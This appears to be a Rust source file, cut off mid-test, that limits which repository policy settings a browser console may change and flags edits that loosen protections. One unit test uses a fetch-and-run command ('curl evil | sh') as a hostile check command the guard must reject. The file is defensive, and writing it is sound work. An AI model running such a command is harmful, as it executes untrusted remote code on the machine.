//! What a policy edit from the console may change.
//!
//! An allowlist: only the fields below may differ between the policy as it is and the edit. Every
//! other field, including any field a future 05 adds, can only be changed at a terminal. Anything
//! that decides what runs, what is trusted, what counts as proof, or what secrets reach a check is
//! deliberately left off it: check commands and their environment, `[env]`, trusted keys,
//! `evidence.accept`, `enforce`, `approvals.min`, `protect.absolute`, `protect.bypass`,
//! `risk.locked`, `risk.exempt_allowed` and `use05.min_version`.
//!
//! Checks may be switched to required or not, removed, or added when this machine detects exactly
//! that command itself; nothing typed in a browser ever becomes a command.

use serde_json::Value;
use use05_core::policy::{CheckDef, Policy};

/// JSON pointers into the serialised policy that the console may change.
pub const EDITABLE: &[&str] = &[
    "/intent/mode",
    "/protect/paths",
    "/protect/locked",
    "/protect/append_only",
    "/protect/no_delete",
    "/protect/no_read",
    "/drift",
    "/evidence/stop_budget_secs",
    "/evidence/prove_at_push",
    "/approvals/expire_days",
    "/record",
    "/risk/rules",
    "/risk/exempt",
    "/branches",
    "/environment",
    "/require",
    "/testing",
    // Path owners and signer groups (D92): the guard below refuses any that loosen.
    "/protect/owner",
    "/signer",
];

fn remove(v: &mut Value, pointer: &str) {
    let (parent, key) = pointer.rsplit_once('/').expect("pointers start with /");
    let target = if parent.is_empty() { Some(&mut *v) } else { v.pointer_mut(parent) };
    if let Some(Value::Object(map)) = target {
        map.remove(key);
    }
}

/// The policy with every editable field and the checks taken out: what must stay equal.
fn fixed(p: &Policy) -> Value {
    let mut v = serde_json::to_value(p).expect("a policy serialises");
    for pointer in EDITABLE {
        remove(&mut v, pointer);
    }
    remove(&mut v, "/check");
    v
}

/// Dotted names of the fields that differ between two JSON values.
fn differences(a: &Value, b: &Value, at: &str, out: &mut Vec<String>) {
    match (a, b) {
        (Value::Object(x), Value::Object(y)) => {
            let mut keys: Vec<&String> = x.keys().chain(y.keys()).collect();
            keys.sort();
            keys.dedup();
            for k in keys {
                let name = if at.is_empty() { k.clone() } else { format!("{at}.{k}") };
                differences(x.get(k).unwrap_or(&Value::Null), y.get(k).unwrap_or(&Value::Null), &name, out);
            }
        }
        _ if a != b => out.push(if at.is_empty() { "(the whole policy)".into() } else { at.to_string() }),
        _ => {}
    }
}

fn same_command(a: &CheckDef, b: &CheckDef) -> bool {
    a.name == b.name && a.run == b.run && a.env == b.env && a.timeout_secs == b.timeout_secs && a.paths == b.paths && a.dir == b.dir
}

/// The settings an edit would change that only a terminal may change. Empty means allowed.
/// `detected` are the checks this machine finds by itself (`detect_checks`).
pub fn terminal_only(old: &Policy, new: &Policy, detected: &[CheckDef]) -> Vec<String> {
    let mut bad = Vec::new();
    differences(&fixed(old), &fixed(new), "", &mut bad);
    for check in &new.check {
        let known = old.check.iter().any(|c| same_command(c, check)) || detected.iter().any(|d| d.name == check.name && d.run == check.run && check.env.is_empty() && check.timeout_secs == d.timeout_secs && check.paths == d.paths && check.dir == d.dir);
        if !known {
            bad.push(format!("check \"{}\" (its command)", check.name));
        }
    }
    bad
}

/// The settings an edit makes less strict: a browser may only tighten (D86); loosening is a
/// terminal change. Empty means the edit only adds or raises. Names are dotted, in policy order.
pub fn loosens(old: &Policy, new: &Policy) -> Vec<String> {
    use use05_core::policy::{LandMode, Middle, same_person};
    let lost = |a: &[String], b: &[String]| a.iter().any(|x| !b.contains(x));
    let mut out: Vec<&str> = Vec::new();
    let (o, n) = (&old.protect, &new.protect);
    for (name, a, b) in [("protect.paths", &o.paths, &n.paths), ("protect.locked", &o.locked, &n.locked), ("protect.append_only", &o.append_only, &n.append_only), ("protect.no_delete", &o.no_delete, &n.no_delete), ("protect.no_read", &o.no_read, &n.no_read)] {
        if lost(a, b) {
            out.push(name);
        }
    }
    let (o, n) = (&old.drift, &new.drift);
    for (name, a, b) in [("drift.scope", o.scope, n.scope), ("drift.dependencies", o.dependencies, n.dependencies), ("drift.overlap", o.overlap, n.overlap), ("drift.claims", o.claims, n.claims), ("drift.tests", o.tests, n.tests)] {
        if b < a {
            out.push(name);
        }
    }
    if new.drift.reservation_idle_hours < old.drift.reservation_idle_hours {
        out.push("drift.reservation_idle_hours");
    }
    if new.intent.mode < old.intent.mode {
        out.push("intent.mode");
    }
    if new.branches.fresh_base < old.branches.fresh_base {
        out.push("branches.fresh_base");
    }
    if old.branches.land == LandMode::Manual && new.branches.land == LandMode::Auto {
        out.push("branches.land");
    }
    if old.branches.push == LandMode::Manual && new.branches.push == LandMode::Auto {
        out.push("branches.push");
    }
    if lost(&old.branches.keep, &new.branches.keep) {
        out.push("branches.keep");
    }
    // A new work pattern makes more branches agents' working space, which landing cleans up.
    if lost(&new.branches.work, &old.branches.work) {
        out.push("branches.work");
    }
    if old.branches.target != new.branches.target {
        out.push("branches.target");
    }
    if new.evidence.stop_budget_secs < old.evidence.stop_budget_secs {
        out.push("evidence.stop_budget_secs");
    }
    if old.evidence.prove_at_push && !new.evidence.prove_at_push {
        out.push("evidence.prove_at_push");
    }
    if new.approvals.expire_days > old.approvals.expire_days {
        out.push("approvals.expire_days");
    }
    if old.record.middle == Middle::Local && new.record.middle == Middle::Off {
        out.push("record.middle");
    }
    // Every old risk rule still holds: same category, at least as high, over at least its paths.
    if old.risk.rules.iter().any(|r| !new.risk.rules.iter().any(|x| x.category == r.category && x.level >= r.level && !lost(&r.paths, &x.paths))) {
        out.push("risk.rules");
    }
    if lost(&new.risk.exempt, &old.risk.exempt) {
        out.push("risk.exempt");
    }
    // Every environment stays, on its branch and level (kept, never a landing source), and
    // promoting into it gets no easier (D93).
    if old.environment.iter().any(|e| new.environment.iter().find(|x| x.name == e.name).is_none_or(|x| promotion_loosens(old, e, new, x))) {
        out.push("environment");
    }
    // A new destination is a new place code leaves the repository for, and an old one gets no
    // easier to promote to or sent anywhere else (D93).
    if new.destination.iter().any(|d| old.destination.iter().find(|x| x.name == d.name).is_none_or(|x| destination_loosens(old, x, new, d))) {
        out.push("destination");
    }
    // Where an agent may push: a list no longer set, or a remote added to it.
    if let Some(was) = &old.push.agent {
        if new.push.agent.as_ref().is_none_or(|now| lost(now, was)) {
            out.push("push.agent");
        }
    }
    // Every old rule that files change together still holds, at least as strictly: the same
    // trigger, asking for at least the same files.
    if old.require.iter().any(|r| !new.require.iter().any(|x| x.when == r.when && !lost(&r.also, &x.also) && x.severity >= r.severity)) {
        out.push("require");
    }
    // Testing before a push (D87): no less required, for no fewer branches. No list means the
    // landing branch, so a list that leaves it out asks for less.
    if new.testing.local < old.testing.local {
        out.push("testing.local");
    }
    let landing = |p: &Policy| if p.testing.branches.is_empty() { p.branches.target.clone().into_iter().collect() } else { p.testing.branches.clone() };
    let (was, now) = (landing(old), landing(new));
    if lost(&was, &now) || (old.testing.branches.is_empty() && !new.testing.branches.is_empty() && was.is_empty()) {
        out.push("testing.branches");
    }
    // Every old check is still there with its command, and still required if it was.
    if old.check.iter().any(|c| !new.check.iter().any(|x| same_command(x, c) && (x.required || !c.required))) {
        out.push("check");
    }
    // Path owners (D92): every old rule still holds, over at least its paths, asking at least as
    // many owners, from no one it did not name before.
    let within = |a: &[String], b: &[String]| a.iter().all(|x| b.iter().any(|y| same_person(x, y)));
    if old.protect.owner.iter().any(|r| !new.protect.owner.iter().any(|x| !lost(&r.paths, &x.paths) && x.min >= r.min && within(&new.people_of(&x.signers), &old.people_of(&r.signers)))) {
        out.push("protect.owner");
    }
    // A group that gains people lets more people sign, wherever it is named. So does a new group
    // with a name a rule already signs with, the repository's or the organisation's: that name
    // would come to mean whoever the group lists.
    let named: Vec<&String> = old.protect.owner.iter().chain(&new.protect.owner).flat_map(|r| &r.signers).chain(old.protect.floor_owner.iter().chain(&new.protect.floor_owner).flat_map(|r| &r.signers)).collect();
    let widened = old.signer.iter().any(|g| new.signer.iter().any(|x| same_person(&x.name, &g.name) && !within(&x.people, &g.people)));
    let captures = new.signer.iter().any(|x| !old.signer.iter().any(|g| same_person(&g.name, &x.name)) && named.iter().any(|n| same_person(n, &x.name)));
    if widened || captures {
        out.push("signer");
    }
    out.into_iter().map(str::to_string).collect()
}

/// Whether promoting into environment `n` of `np` is easier than into `o` of `op`: a rule held
/// less strongly, an agent let in, a shorter soak, a smaller sign-off from more people, a
/// statement no longer confirmed, more room to bypass. Moving it to another branch, level or
/// source, or changing how it moves, how its deploy is confirmed or what happens when it fails,
/// counts too: those are a person's to decide.
fn promotion_loosens(op: &Policy, o: &use05_core::policy::Environment, np: &Policy, n: &use05_core::policy::Environment) -> bool {
    let from =|p: &Policy, e: &use05_core::policy::Environment| p.source_of(e).map(|s| s.name.clone());
    if o.branch != n.branch || o.level() != n.level() || from(op, o) != from(np, n) || o.how() != n.how() || o.on_failure() != n.on_failure() || o.rollback != n.rollback || o.rollback_env != n.rollback_env || o.rollback_timeout_secs != n.rollback_timeout_secs || o.probe != n.probe || o.smoke != n.smoke {
        return true;
    }
    target_loosens(op, o, np, n)
}

/// Whether promoting to destination `n` of `np` is easier than to `o` of `op`: anything sent
/// elsewhere (another kind, source, remote or branch) or the same rules held less strongly.
fn destination_loosens(op: &Policy, o: &use05_core::policy::Destination, np: &Policy, n: &use05_core::policy::Destination) -> bool {
    o.how != n.how || o.from != n.from || o.remote != n.remote || o.branch != n.branch || target_loosens(op, o, np, n)
}

/// What an environment and a destination share (D93): an agent let in, a rule held less strongly,
/// a shorter soak, a smaller sign-off from more people, a statement no longer confirmed, more
/// room to bypass.
fn target_loosens(op: &Policy, o: &dyn use05_core::policy::Target, np: &Policy, n: &dyn use05_core::policy::Target) -> bool {
    use use05_core::policy::{PROMOTE_RULES, same_person};
    let lost = |a: &[String], b: &[String]| a.iter().any(|x| !b.contains(x));
    let within = |a: &[String], b: &[String]| a.iter().all(|x| b.iter().any(|y| same_person(x, y)));
    if np.agent_may_promote(n) && !op.agent_may_promote(o) {
        return true;
    }
    // A hotfix's rules count as much as a promotion's (D93): any held less strongly loosens.
    if n.soak_minutes().unwrap_or(0) < o.soak_minutes().unwrap_or(0) || PROMOTE_RULES.iter().any(|r| n.rules().get(r) < o.rules().get(r) || n.hotfix_rule(r) < o.hotfix_rule(r)) {
        return true;
    }
    let (os, ns) = (o.sign_off().cloned().unwrap_or_default(), n.sign_off().cloned().unwrap_or_default());
    if ns.min_length < os.min_length || lost(&os.questions, &ns.questions) {
        return true;
    }
    // No signers named means anyone with an approver key: naming none after some is more people.
    if !os.signers.is_empty() && (ns.signers.is_empty() || !within(&np.people_of(&ns.signers), &op.people_of(&os.signers))) {
        return true;
    }
    if o.confirm().iter().any(|c| !n.confirm().contains(c)) {
        return true;
    }
    let (ob, nb) = (o.bypass(), n.bypass());
    (nb.allowed && !ob.allowed) || lost(&ob.never, &nb.never) || nb.reason_min < ob.reason_min
}

/// [`loosens`], with an organisation floor applied to both sides first, so that what the floor
/// asks (its owner rules' signer names, D92) is part of what an edit is weighed against.
pub fn loosens_under(old: &Policy, new: &Policy, floor: Option<&use05_core::policy::Floor>) -> Vec<String> {
    let Some(floor) = floor else { return loosens(old, new) };
    let (mut old, mut new) = (old.clone(), new.clone());
    old.tighten(floor);
    new.tighten(floor);
    loosens(&old, &new)
}

/// Dotted names of every setting that differs, for showing what an edit does.
pub fn changed(old: &Policy, new: &Policy) -> Vec<String> {
    let mut out = Vec::new();
    differences(&serde_json::to_value(old).unwrap_or_default(), &serde_json::to_value(new).unwrap_or_default(), "", &mut out);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn testing_before_a_push_only_gets_stricter_from_a_browser() {
        let base = "[branches]\ntarget = \"main\"\n";
        let at = |testing: &str| p(&format!("{base}{testing}"));
        let off = at("");
        let skippable = at("[testing]\nlocal = \"skippable\"\n");
        let required = at("[testing]\nlocal = \"required\"\n");
        assert!(loosens(&off, &skippable).is_empty() && loosens(&skippable, &required).is_empty(), "turning it on, then up, tightens");
        assert_eq!(loosens(&required, &skippable), vec!["testing.local".to_string()]);
        assert_eq!(loosens(&skippable, &off), vec!["testing.local".to_string()]);
        let release = at("[testing]\nlocal = \"required\"\nbranches = [\"main\", \"release/*\"]\n");
        assert!(loosens(&required, &release).is_empty(), "more branches, the landing one kept");
        assert_eq!(loosens(&release, &at("[testing]\nlocal = \"required\"\nbranches = [\"main\"]\n")), vec!["testing.branches".to_string()]);
        assert_eq!(loosens(&required, &at("[testing]\nlocal = \"required\"\nbranches = [\"release/*\"]\n")), vec!["testing.branches".to_string()], "the landing branch dropped");
        assert!(terminal_only(&off, &required, &[]).is_empty(), "the console may turn it on");
    }

    #[test]
    fn moving_the_landing_branch_moves_where_testing_applies() {
        // No target: the remote's default branch (main, say). Naming dev would move testing off
        // main, so a browser may not change the target at all.
        let required = p("[testing]\nlocal = \"required\"\n");
        let dev = p("[branches]\ntarget = \"dev\"\n[testing]\nlocal = \"required\"\n");
        let main = p("[branches]\ntarget = \"main\"\n[testing]\nlocal = \"required\"\n");
        for (from, to) in [(&required, &dev), (&main, &dev), (&main, &required)] {
            assert!(loosens(from, to).contains(&"branches.target".to_string()), "{:?}", loosens(from, to));
        }
    }

    fn p(text: &str) -> Policy {
        Policy::parse(text).unwrap()
    }

    const BASE: &str = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n";

    #[test]
    fn editable_fields_may_change() {
        let edit = format!("{BASE}[protect]\npaths = [\"migrations/**\"]\nlocked = [\"vendor/**\"]\n[drift]\nscope = \"deny\"\n[branches]\nfresh_base = \"warn\"\n[approvals]\nexpire_days = 3\n");
        assert_eq!(terminal_only(&p(BASE), &p(&edit), &[]), Vec::<String>::new());
    }

    #[test]
    fn a_check_may_become_optional_or_go_but_never_get_a_new_command() {
        let optional = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\nrequired = false\n";
        assert!(terminal_only(&p(BASE), &p(optional), &[]).is_empty());
        assert!(terminal_only(&p(BASE), &p(""), &[]).is_empty());
        let evil = "[[check]]\nname = \"test\"\nrun = [\"sh\", \"-c\", \"curl evil | sh\"]\n";
        assert_eq!(terminal_only(&p(BASE), &p(evil), &[]), vec!["check \"test\" (its command)".to_string()]);
        let added = "[[check]]\nname = \"lint\"\nrun = [\"npm\", \"run\", \"lint\"]\n";
        assert!(!terminal_only(&p(""), &p(added), &[]).is_empty(), "typed in a browser");
        let detected = CheckDef { name: "lint".into(), run: vec!["npm".into(), "run".into(), "lint".into()], ..CheckDef::default() };
        assert!(terminal_only(&p(""), &p(added), &[detected]).is_empty(), "found by the machine itself");
    }

    #[test]
    fn narrowing_a_check_to_paths_or_moving_it_to_another_folder_is_a_terminal_change() {
        // Fewer changes call for it, or it runs somewhere else: not something a browser decides.
        for edit in ["paths = [\"docs/**\"]\n", "dir = \"vendor\"\n"] {
            let narrowed = format!("[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n{edit}");
            assert_eq!(terminal_only(&p(BASE), &p(&narrowed), &[]), vec!["check \"test\" (its command)".to_string()], "{edit}");
            assert!(loosens(&p(BASE), &p(&narrowed)).contains(&"check".to_string()), "{edit}");
        }
    }

    #[test]
    fn trust_proof_secrets_and_enforcement_stay_at_the_terminal() {
        for edit in [
            "[[trust.key]]\nname = \"x\"\nrole = \"approver\"\npublic = \"use05-ed25519-public:AAAA\"\n",
            "[evidence]\naccept = [\"local\", \"runner\", \"approver\"]\n",
            "[enforce]\non_error = \"closed\"\n",
            "[approvals]\nmin = 2\n",
            "[protect]\nbypass = false\n",
            "[protect]\nabsolute = [\"x/**\"]\n",
            "[env]\nallow = [\"AWS_SECRET_ACCESS_KEY\"]\n",
        ] {
            assert!(!terminal_only(&p(""), &p(edit), &[]).is_empty(), "{edit}");
        }
    }

    const STRICT: &str = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n[protect]\npaths = [\"migrations/**\"]\nlocked = [\"vendor/**\"]\nappend_only = [\"CHANGELOG.md\"]\nno_delete = [\"docs/**\"]\nno_read = [\".env\"]\n[drift]\nscope = \"approval\"\n[intent]\nmode = \"risky\"\n[branches]\nkeep = [\"release/*\"]\nfresh_base = \"warn\"\n[evidence]\nprove_at_push = true\nstop_budget_secs = 60\n[approvals]\nexpire_days = 7\n[[risk.rules]]\ncategory = \"money\"\nlevel = \"high\"\npaths = [\"src/billing/**\"]\n[[require]]\nwhen = [\"src/api/**\"]\nalso = [\"docs/api.md\"]\nseverity = \"approval\"\n";

    fn with(extra: &str) -> Policy {
        // A later table with the same name would be a TOML error, so edits replace text in STRICT.
        p(extra)
    }

    #[test]
    fn adding_and_raising_is_tightening() {
        let edit = STRICT
            .replace("locked = [\"vendor/**\"]", "locked = [\"vendor/**\", \"infra/**\"]")
            .replace("scope = \"approval\"", "scope = \"deny\"")
            .replace("mode = \"risky\"", "mode = \"always\"")
            .replace("expire_days = 7", "expire_days = 3")
            + "[[require]]\nwhen = [\"src/**\"]\nalso = [\"CHANGELOG.md\"]\n";
        assert_eq!(loosens(&p(STRICT), &with(&edit)), Vec::<String>::new());
    }

    #[test]
    fn each_kind_of_loosening_is_named() {
        for (from, to, name) in [
            ("paths = [\"migrations/**\"]", "paths = []", "protect.paths"),
            ("locked = [\"vendor/**\"]", "locked = []", "protect.locked"),
            ("append_only = [\"CHANGELOG.md\"]", "append_only = []", "protect.append_only"),
            ("no_delete = [\"docs/**\"]", "no_delete = []", "protect.no_delete"),
            ("no_read = [\".env\"]", "no_read = []", "protect.no_read"),
            ("scope = \"approval\"", "scope = \"warn\"", "drift.scope"),
            ("fresh_base = \"warn\"", "fresh_base = \"allow\"", "branches.fresh_base"),
            ("mode = \"risky\"", "mode = \"inferred\"", "intent.mode"),
            ("fresh_base = \"warn\"\n", "fresh_base = \"warn\"\nland = \"auto\"\n", "branches.land"),
            ("keep = [\"release/*\"]", "keep = []", "branches.keep"),
            ("prove_at_push = true", "prove_at_push = false", "evidence.prove_at_push"),
            ("stop_budget_secs = 60", "stop_budget_secs = 10", "evidence.stop_budget_secs"),
            ("expire_days = 7", "expire_days = 30", "approvals.expire_days"),
            ("level = \"high\"", "level = \"low\"", "risk.rules"),
            ("severity = \"approval\"", "severity = \"warn\"", "require"),
            ("[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n", "", "check"),
            ("[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n", "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\nrequired = false\n", "check"),
        ] {
            let edit = STRICT.replace(from, to);
            assert_ne!(edit, STRICT, "{name}: the replacement did not apply");
            assert_eq!(loosens(&p(STRICT), &with(&edit)), vec![name.to_string()], "{name}");
        }
        let exempt = format!("{STRICT}[risk]\nexempt = [\"src/billing/fixtures/**\"]\n");
        assert_eq!(loosens(&p(STRICT), &with(&exempt)), vec!["risk.exempt".to_string()]);
        let quieter = format!("{STRICT}[record]\nmiddle = \"off\"\n");
        assert_eq!(loosens(&p(STRICT), &with(&quieter)), vec!["record.middle".to_string()]);
    }

    #[test]
    fn work_branches_environments_and_reservations_cannot_be_loosened() {
        let work = STRICT.replace("keep = [\"release/*\"]", "keep = [\"release/*\"]\nwork = [\"*\"]");
        assert_eq!(loosens(&p(STRICT), &with(&work)), vec!["branches.work".to_string()]);
        let quick = format!("{STRICT}").replace("scope = \"approval\"", "scope = \"approval\"\nreservation_idle_hours = 1");
        assert_eq!(loosens(&p(STRICT), &with(&quick)), vec!["drift.reservation_idle_hours".to_string()]);
        let longer = STRICT.replace("scope = \"approval\"", "scope = \"approval\"\nreservation_idle_hours = 8");
        assert!(loosens(&p(STRICT), &with(&longer)).is_empty(), "longer reservations are stricter");
        let with_env = format!("{STRICT}[[environment]]\nname = \"prod\"\nbranch = \"prod\"\nlevel = \"prod\"\n");
        assert_eq!(loosens(&p(&with_env), &with(STRICT)), vec!["environment".to_string()], "an environment removed");
        assert!(loosens(&p(STRICT), &with(&with_env)).is_empty(), "an environment added");
    }

    #[test]
    fn promotion_rules_may_get_stricter_and_never_looser() {
        let ladder = format!("{STRICT}[[environment]]\nname = \"dev\"\nbranch = \"main\"\n\n[[environment]]\nname = \"prod\"\nbranch = \"prod\"\n");
        let base = format!("{ladder}soak_minutes = 30\n\n[environment.rules]\nmigrations = \"approval\"\n\n[[environment.confirm]]\ntext = \"Notes are out\"\n");
        let looser = |what: &str| assert_eq!(loosens(&p(&base), &with(what)), vec!["environment".to_string()], "{what}");
        let stricter = |what: &str| assert!(loosens(&p(&base), &with(what)).is_empty(), "{what}");
        stricter(&base.replace("migrations = \"approval\"", "migrations = \"deny\""));
        stricter(&base.replace("soak_minutes = 30", "soak_minutes = 60"));
        stricter(&format!("{base}\n[environment.sign_off]\nmin_length = 20\n"));
        looser(&base.replace("migrations = \"approval\"", "migrations = \"warn\""));
        looser(&base.replace("soak_minutes = 30", "soak_minutes = 5"));
        looser(&base.replace("soak_minutes = 30", "soak_minutes = 30\nagent = true"));
        looser(&base.replace("\n[[environment.confirm]]\ntext = \"Notes are out\"\n", "\n"));
        looser(&base.replace("soak_minutes = 30", "soak_minutes = 30\nhow = \"merge\""));
        looser(&base.replace("soak_minutes = 30", "soak_minutes = 30\non_failure = \"command\"\nrollback = [\"./undo.sh\"]"));
        let probed = format!("{base}\n[[environment.probe]]\nname = \"version\"\nrun = [\"./version.sh\"]\n\n[[environment.smoke]]\nname = \"health\"\nrun = [\"./health.sh\"]\n");
        let from_probed = |what: &str| loosens(&p(&probed), &with(what));
        assert_eq!(from_probed(&base), vec!["environment".to_string()], "probes and smoke checks removed");
        assert_eq!(from_probed(&probed.replace("./version.sh", "true")), vec!["environment".to_string()], "a probe changed");
        assert_eq!(from_probed(&probed.replace("./health.sh", "true")), vec!["environment".to_string()], "a smoke check changed");
        let command = base.replace("soak_minutes = 30", "soak_minutes = 30\non_failure = \"command\"\nrollback = [\"./undo.sh\"]\nrollback_env = [\"TOKEN\"]");
        let from_command = |what: &str| loosens(&p(&command), &with(what));
        assert_eq!(from_command(&command.replace("rollback_env = [\"TOKEN\"]", "rollback_env = [\"TOKEN\", \"OTHER\"]")), vec!["environment".to_string()], "the rollback command given more");
        assert_eq!(from_command(&command.replace("rollback_env = [\"TOKEN\"]", "rollback_env = [\"TOKEN\"]\nrollback_timeout_secs = 60")), vec!["environment".to_string()], "its time limit changed");
        assert_eq!(from_command(&command.replace("./undo.sh", "./other.sh")), vec!["environment".to_string()], "the command changed");
        // Who signs off, and how much room there is to bypass.
        let signed = format!("{PEOPLE}{base}\n[environment.sign_off]\nsigners = [\"Dana\"]\n\n[environment.bypass]\nallowed = false\nnever = [\"source_checks\"]\nreason_min = 20\n");
        let from_signed = |what: &str| loosens(&p(&signed), &p(what));
        assert!(from_signed(&signed.replace("allowed = false", "allowed = false\n# same")).is_empty());
        assert_eq!(from_signed(&signed.replace("signers = [\"Dana\"]", "signers = [\"Dana\", \"Lee\"]")), vec!["environment".to_string()], "a signer added");
        assert_eq!(from_signed(&signed.replace("signers = [\"Dana\"]", "signers = []")), vec!["environment".to_string()], "no signers named: anyone may sign");
        assert_eq!(from_signed(&signed.replace("allowed = false", "allowed = true")), vec!["environment".to_string()], "bypass let in");
        assert_eq!(from_signed(&signed.replace("never = [\"source_checks\"]", "never = []")), vec!["environment".to_string()], "a rule bypass may now clear");
        assert_eq!(from_signed(&signed.replace("reason_min = 20", "reason_min = 5")), vec!["environment".to_string()], "a shorter reason");
        assert!(loosens(&p(&signed.replace("signers = [\"Dana\"]", "signers = [\"Dana\", \"Lee\"]")), &p(&signed)).is_empty(), "dropping a signer is stricter");
        // A new top rung lets agents onto prod, which was the last.
        looser(&format!("{base}\n[[environment]]\nname = \"prod-plus\"\nbranch = \"plus\"\nlevel = \"prod\"\n").replace("name = \"prod\"\nbranch = \"prod\"", "name = \"prod\"\nbranch = \"prod\"\nlevel = \"pre-prod\""));
    }

    #[test]
    fn a_destination_added_or_eased_and_a_remote_an_agent_may_push_to_loosen() {
        let base = format!("{STRICT}[push]\nagent = [\"origin\"]\n\n[[destination]]\nname = \"public\"\nhow = \"export\"\nfrom = \"product/\"\nremote = \"/srv/public.git\"\nbranch = \"main\"\n\n[destination.rules]\nuntasked = \"deny\"\n");
        let looser = |what: &str, name: &str| assert_eq!(loosens(&p(&base), &with(what)), vec![name.to_string()], "{what}");
        assert!(loosens(&p(&base), &with(&base.replace("untasked = \"deny\"", "untasked = \"deny\"\nsign_off = \"approval\""))).is_empty(), "a rule held more strongly");
        assert!(loosens(&p(&base), &with(&base.replace("agent = [\"origin\"]", "agent = []"))).is_empty(), "fewer remotes");
        looser(&format!("{base}\n[[destination]]\nname = \"mirror\"\nhow = \"push\"\nremote = \"backup\"\nbranch = \"main\"\n"), "destination");
        looser(&base.replace("untasked = \"deny\"", "untasked = \"warn\""), "destination");
        looser(&base.replace("branch = \"main\"\n", "branch = \"main\"\nagent = true\n"), "destination");
        looser(&base.replace("/srv/public.git", "/srv/other.git"), "destination");
        looser(&base.replace("\"product/\"", "\".\""), "destination");
        looser(&base.replace("agent = [\"origin\"]", "agent = [\"origin\", \"public\"]"), "push.agent");
        looser(&base.replace("[push]\nagent = [\"origin\"]\n", ""), "push.agent");
        assert!(loosens(&p(STRICT), &with(&format!("{STRICT}[push]\nagent = [\"origin\"]\n"))).is_empty(), "a list set where there was none");
    }

    #[test]
    fn a_hotfixs_rules_may_get_stricter_and_never_looser() {
        let ladder = format!("{STRICT}[[environment]]\nname = \"dev\"\nbranch = \"main\"\n\n[[environment]]\nname = \"prod\"\nbranch = \"prod\"\n");
        let base = format!("{ladder}\n[environment.hotfix.rules]\nsource_checks = \"deny\"\nmigrations = \"deny\"\n");
        let looser = |what: &str| assert_eq!(loosens(&p(&base), &with(what)), vec!["environment".to_string()], "{what}");
        assert!(loosens(&p(&base), &with(&base.replace("[environment.hotfix.rules]\n", "[environment.hotfix.rules]\nuntasked = \"deny\"\n"))).is_empty(), "a rule added");
        looser(&base.replace("source_checks = \"deny\"", "source_checks = \"warn\""));
        looser(&base.replace("migrations = \"deny\"", "migrations = \"approval\""));
        looser(&ladder);
        // Unset, a hotfix is held to the environment's own rules but those about a source.
        assert!(loosens(&p(&ladder), &with(&base)).is_empty());
        assert_eq!(loosens(&p(&ladder), &with(&format!("{ladder}\n[environment.hotfix.rules]\nmigrations = \"warn\"\n"))), vec!["environment".to_string()], "below prod's own approval");
    }

    #[test]
    fn a_require_rule_may_ask_for_more() {
        let more = STRICT.replace("also = [\"docs/api.md\"]", "also = [\"docs/api.md\", \"CHANGELOG.md\"]");
        assert!(loosens(&p(STRICT), &with(&more)).is_empty(), "{:?}", loosens(&p(STRICT), &with(&more)));
        let fewer_when = STRICT.replace("when = [\"src/api/**\"]", "when = [\"src/api/v2/**\"]");
        assert_eq!(loosens(&p(STRICT), &with(&fewer_when)), vec!["require".to_string()]);
    }

    #[test]
    fn a_mixed_edit_names_only_what_loosens() {
        let edit = STRICT.replace("paths = [\"migrations/**\"]", "paths = []").replace("locked = [\"vendor/**\"]", "locked = [\"vendor/**\", \"infra/**\"]");
        assert_eq!(loosens(&p(STRICT), &with(&edit)), vec!["protect.paths".to_string()]);
    }

    #[test]
    fn changed_names_the_settings() {
        let edit = "[drift]\nscope = \"deny\"\n";
        assert_eq!(changed(&p(""), &p(edit)), vec!["drift.scope".to_string()]);
    }

    // ------------------------------------------------------------------------- owners (D92)

    const PEOPLE: &str = "[[trust.key]]\nname = \"dana\"\nrole = \"approver\"\npublic = \"use05-ed25519-public:AAAA\"\nperson = \"Dana\"\n[[trust.key]]\nname = \"lee\"\nrole = \"approver\"\npublic = \"use05-ed25519-public:BBBB\"\nperson = \"Lee\"\n[[trust.key]]\nname = \"sam\"\nrole = \"approver\"\npublic = \"use05-ed25519-public:CCCC\"\nperson = \"Sam\"\n";
    const OWNED: &str = "[[signer]]\nname = \"eng-managers\"\npeople = [\"Dana\", \"Lee\"]\n\n[[protect.owner]]\npaths = [\"billing/**\", \"payments/**\"]\nsigners = [\"eng-managers\"]\n";

    fn owners(rest: &str) -> Policy {
        p(&format!("{PEOPLE}{rest}"))
    }

    #[test]
    fn adding_someone_to_a_group_loosens() {
        let wider = OWNED.replace("[\"Dana\", \"Lee\"]", "[\"Dana\", \"Lee\", \"Sam\"]");
        // The group widens, and so does the rule that names it.
        assert_eq!(loosens(&owners(OWNED), &owners(&wider)), vec!["protect.owner".to_string(), "signer".to_string()]);
        let unused = format!("{OWNED}[[signer]]\nname = \"ops\"\npeople = [\"Lee\"]\n");
        assert_eq!(loosens(&owners(&unused), &owners(&unused.replace("people = [\"Lee\"]", "people = [\"Lee\", \"Sam\"]"))), vec!["signer".to_string()], "a group no rule names yet still loosens: sign-offs name groups too");
        let narrower = OWNED.replace("[\"Dana\", \"Lee\"]", "[\"dana\"]");
        assert!(loosens(&owners(OWNED), &owners(&narrower)).is_empty(), "fewer people may approve: stricter");
        // Pointing the rule at someone else lets another person approve.
        let elsewhere = OWNED.replace("signers = [\"eng-managers\"]", "signers = [\"Sam\"]");
        assert_eq!(loosens(&owners(OWNED), &owners(&elsewhere)), vec!["protect.owner".to_string()]);
    }

    #[test]
    fn adding_a_group_with_a_name_the_floor_signs_with_loosens() {
        use use05_core::policy::{Floor, OwnerRule, TrustKey};
        // The organisation names Lee, a person only its own keys know; a repository that adds a
        // group "Lee" would decide who that means, if it were ever read as one.
        let floor = Floor {
            trust_key: vec![TrustKey { name: "lee".into(), role: use05_core::policy::Role::Approver, public: "use05-ed25519-public:LLLL".into(), expires: None, person: Some("Lee".into()) }],
            protect_owner: vec![OwnerRule { paths: vec!["infra/**".into()], signers: vec!["Lee".into()], min: 1 }],
            ..Floor::default()
        };
        let before = p(PEOPLE.split("[[trust.key]]\nname = \"lee\"").next().unwrap());
